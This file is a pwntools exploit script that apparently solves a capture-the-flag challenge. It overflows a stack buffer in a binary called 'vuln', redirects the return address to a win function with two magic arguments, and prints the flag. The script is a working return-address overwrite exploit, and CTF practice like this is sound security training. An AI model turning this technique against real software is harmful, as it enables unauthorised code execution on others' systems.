#!/usr/bin/env python3
from pwn import *
import pwn
import time, os, traceback, sys, os
import binascii, array
from textwrap import wrap
def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath]+argv, gdbscript=gdbscript, aslr=False, *a, **kw)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath]+argv,aslr=False, *a, **kw)
# Set up the target binary and the remote server
binary = ELF('vuln')
binPath ="./vuln"
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
io = process(binary.path)
# build in GDB support
gdbscript = '''
init-pwndbg
break *vuln + 62
continue
'''.format(**locals())
p=start()
p.recvuntil(b'\n')
overflow = 188*b'A'
ret = pwn.p32(0x080491e2)
flow1 = pwn.p32(0xdeadbeef)
flow2 = pwn.p32(0xc0ded00d)
flowing =  4*b'C'
payload =  pwn.flat(
            [
                 overflow,
                 ret,
                 flowing,
                 flow1,
                 flow2 
                    ]
             )
p.sendline(payload)
p.recv()
response = p.recv()
flag = response.decode("utf-8")
print(flag)
p.interactive()
